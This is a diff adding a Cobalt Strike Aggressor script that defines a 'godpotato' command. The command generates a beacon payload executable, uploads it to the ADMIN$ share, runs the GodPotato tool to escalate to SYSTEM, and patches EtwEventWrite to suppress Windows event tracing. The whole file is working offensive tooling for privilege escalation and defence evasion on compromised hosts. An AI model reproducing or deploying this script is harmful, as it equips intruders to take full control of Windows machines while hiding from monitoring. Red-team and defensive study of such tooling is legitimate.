@@ -1,0 +1,18 @@
+#GodPotato can be found at https://github.com/BeichenDream/GodPotato
+# $1 = bid, $2 = listener
+alias godpotato {
+
+   btask($1, "Tasked Beacon to escalate to SYSTEM");
+   # we need a random file name.
+   $name = rand(@("d612", "t5op", "5d2d")) . rand(100) . ".exe";
+
+   # generate an EXE. $arch defined via &lambda when this function was registered with
+   $exedata = artifact_payload($2, "exe", "x64", "process", "Indirect");
+
+   # upload the EXE to our target (directly)
+   bupload_raw!($1, "\\\\127.0.0.1\\ADMIN\$\\ $+ $name", $exedata);
+
+   bexecute_assembly($1, script_resource("GodPotato-NET4.exe"), "-cmd \\\\127.0.0.1\\ADMIN\$\\ $+ $name $+ ","PATCHES:ntdll.dll,EtwEventWrite,0,C300");
+   # assume control of our payload (if it's an SMB or TCP Beacon)
+   beacon_link($1, $2, $3);
+}
